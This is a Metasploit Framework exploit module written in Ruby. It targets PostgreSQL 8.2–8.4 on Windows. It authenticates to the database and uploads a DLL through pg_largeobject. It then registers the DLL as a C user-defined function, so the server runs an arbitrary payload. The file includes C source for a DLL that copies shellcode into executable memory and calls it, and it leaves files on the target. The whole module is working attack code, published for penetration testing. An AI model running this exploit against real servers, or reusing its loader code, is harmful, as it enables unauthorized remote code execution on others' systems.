##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/postgres'
load 'lib/msf/core/exploit/postgres.rb'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Postgres
	include Msf::Auxiliary::Report

	# Creates an instance of this module.
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PostgreSQL for Microsoft Windows Payload Execution',
			'Description'    => %q{
				This module creates and enables a custom UDF (user defined function) on the
				target host via the UPDATE pg_largeobject method of binary injection. On
				default Microsoft Windows installations of PostgreSQL (=< 8.4), the postgres
				service account may write to the Windows temp directory, and may source
				UDF DLL's from there as well.

				PostgreSQL versions 8.2.x, 8.3.x, and 8.4.x on Microsoft Windows (32-bit) are
				valid targets for this module.

				NOTE: This module will leave a payload executable on the target system when the
				attack is finished, as well as the UDF DLL and the OID.
			},
			'Author'         =>
			[
				'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>', # the postgresql udf libraries
				'todb' # this Metasploit module
			],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'URL', 'http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf',
						'URL', 'http://lab.lonerunners.net/blog/sqli-writing-files-to-disk-under-postgresql' # A litte more specific to PostgreSQL
					]
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 32-bit', { 'arch' => ARCH_X86    } ],
					[ 'Windows 64-bit', { 'arch' => ARCH_X86_64 } ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Apr 10 2009' # Date of Bernardo's BH Europe paper.
		))

		deregister_options('SQL', 'RETURN_ROWSET')
	end

	# Buncha stuff to make typing easier.
	def username; datastore['USERNAME']; end
	def password; datastore['PASSWORD']; end
	def database; datastore['DATABASE']; end
	def verbose; datastore['VERBOSE']; end
	def rhost; datastore['RHOST']; end
	def rport; datastore['RPORT']; end

	def execute_command(cmd, opts)
		postgres_sys_exec(cmd)
	end

	def exploit
		#fname = "#{Rex::Text.rand_text_alpha(8)}.dll"
		fname = "egypt.dll"

		version = do_login(username,password,database)
		case version
		when :noauth; print_error "Authentication failed."; return
		when :noconn; print_error "Connection failed."; return
		else
			print_status("#{rhost}:#{rport} - #{version}")
		end

		tbl,fld,dll,oid = postgres_upload_binary_data(payload_dll(fname), fname)
		unless tbl && fld && dll && oid
			print_error "Could not upload the UDF DLL"
			return
		end

		print_status "Uploaded #{dll} as OID #{oid} to table #{tbl}(#{fld})"
		func_name = Rex::Text.rand_text_alpha(10)
		postgres_query(
			"create or replace function pg_temp.#{func_name}()"+
			" returns void as '#{dll}','#{func_name}'"+
			" language C strict immutable"
		)

		postgres_logout if @postgres_conn
	end

	def dll_fname(version)
		File.join(Msf::Config.install_root,"data","exploits","postgres",version,"lib_postgresqludf_sys.dll")
	end

	# Authenticate to the postgres server.
	#
	# Returns the version from #postgres_fingerprint
	def do_login(user=nil,pass=nil,database=nil)
		begin
			password = pass || postgres_password
			vprint_status("Trying #{user}:#{password}@#{rhost}:#{rport}/#{database}")
			result = postgres_fingerprint(
				:db => database,
				:username => user,
				:password => password
			)
			if result[:auth]
				report_service(
					:host => rhost,
					:port => rport,
					:name => "postgres",
					:info => result.values.first
				)
				return result[:auth]
			else
				return :noauth
			end
		rescue Rex::ConnectionError, Rex::Post::Meterpreter::RequestError
			return :noconn
		end
	end


	def payload_dll(filename)
		shellcode = Rex::Text.to_hex(payload.encoded, "\\x")
		#shellcode = "\\xcc"

		c = %Q^
			#define PAGE_EXECUTE_READWRITE 0x40
			#define MEM_COMMIT  0x00001000
			#define MEM_RESERVE 0x00002000
			#define NULL ((void*)0)
	
			char shellcode[] = "#{shellcode}";

			__stdcall void* VirtualAlloc(void *, int, int, int);
			__stdcall void memcpy(void *, const void *, int);

			int
			DllMain(void* hinstDLL, int fdwReason, void* lpvReserved)
			{
				int (*fp)();
				fp = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				memcpy(fp, shellcode, sizeof(shellcode));
				fp();
				return 1;
			}
		^

		cpu = case target['arch']
			when ARCH_X86;    Metasm::Ia32.new
			when ARCH_X86_64; Metasm::X86_64.new
			end
		payload_so = Metasm::PE.compile_c(cpu, c, "payload.c")

		so_file = payload_so.encode_string(:lib)

		File.open("payload.dll", "wb") { |fd| fd.write so_file }

		so_file
	end

end
